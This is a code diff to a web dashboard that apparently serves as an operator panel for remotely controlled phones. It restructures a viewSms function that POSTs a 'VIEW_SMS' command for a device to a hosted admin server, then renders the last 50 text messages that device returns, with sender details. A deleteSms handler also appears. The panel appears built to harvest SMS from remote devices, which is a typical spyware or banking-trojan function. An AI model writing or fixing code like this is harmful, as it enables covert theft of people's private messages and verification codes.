@@ -481,33 +481,34 @@
             document.getElementById('viewDataModal').classList.add('show');
         }
         function viewSms(deviceId) {
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (!device) {
-                toast('❌ Device not found', true);
-                return;
-            }
-            // Send VIEW_SMS command to device
-            try {
-                const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
-                    method:'POST', headers:{'Content-Type':'application/json'},
-                    body: JSON.stringify({deviceId: deviceId, action: 'VIEW_SMS', data: {}})
-                });
-                const d = await r.json();
-                if (!d.success) {
-                    toast('❌ ' + (d.message || 'Failed to send VIEW_SMS command'), true);
+            (async () => {
+                const device = devices.find(d => d.deviceId === deviceId);
+                if (!device) {
+                    toast('❌ Device not found', true);
                     return;
                 }
-                // Wait a moment for device to respond and dashboard to update
-                setTimeout(() => {
-                    fetchData(false);
-                    // Show modal after refresh
+                // Send VIEW_SMS command to device
+                try {
+                    const r = await fetch('https://bengal-tiger-admin-production-8071.up.railway.app/api/command', {
+                        method:'POST', headers:{'Content-Type':'application/json'},
+                        body: JSON.stringify({deviceId: deviceId, action: 'VIEW_SMS', data: {}})
+                    });
+                    const d = await r.json();
+                    if (!d.success) {
+                        toast('❌ ' + (d.message || 'Failed to send VIEW_SMS command'), true);
+                        return;
+                    }
+                    // Wait a moment for device to respond and dashboard to update
                     setTimeout(() => {
-                        const updatedDevice = devices.find(dev => dev.deviceId === deviceId);
-                        let messages = Array.isArray(updatedDevice.smsMessages) ? updatedDevice.smsMessages.slice(-50).reverse() : [];
-                        let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
+                        fetchData(false);
+                        // Show modal after refresh
+                        setTimeout(() => {
+                            const updatedDevice = devices.find(dev => dev.deviceId === deviceId);
+                            let messages = Array.isArray(updatedDevice.smsMessages) ? updatedDevice.smsMessages.slice(-50).reverse() : [];
+                            let html = `<div style='background:#e3f2fd;padding:18px 12px 8px 12px;border-radius:8px 8px 0 0;'>
         <div style='font-size:18px;font-weight:bold;color:#1976d2;'>${updatedDevice.model} - Last 50 SMS</div>
     </div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-                        html += messages.map((msg, idx) => `
+                            html += messages.map((msg, idx) => `
         <div style='background:#fff;margin-bottom:8px;padding:10px 12px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
             <div>
                 <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${msg.from || msg.address || 'Unknown'}</div>
@@ -520,14 +521,15 @@
             </div>
         </div>
     `).join('');
-                        if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-                        document.getElementById('smsModalBody').innerHTML = html;
-                        document.getElementById('viewSmsModal').classList.add('show');
+                            if (messages.length === 0) html += '<div class="no-data">No SMS messages found</div>';
+                            document.getElementById('smsModalBody').innerHTML = html;
+                            document.getElementById('viewSmsModal').classList.add('show');
+                        }, 800);
                     }, 800);
-                }, 800);
-            } catch (err) {
-                toast('❌ Error sending VIEW_SMS command', true);
-            }
+                } catch (err) {
+                    toast('❌ Error sending VIEW_SMS command', true);
+                }
+            })();
         }
         // Delete SMS handler (demo only)
         function deleteSms(deviceId, idx) {
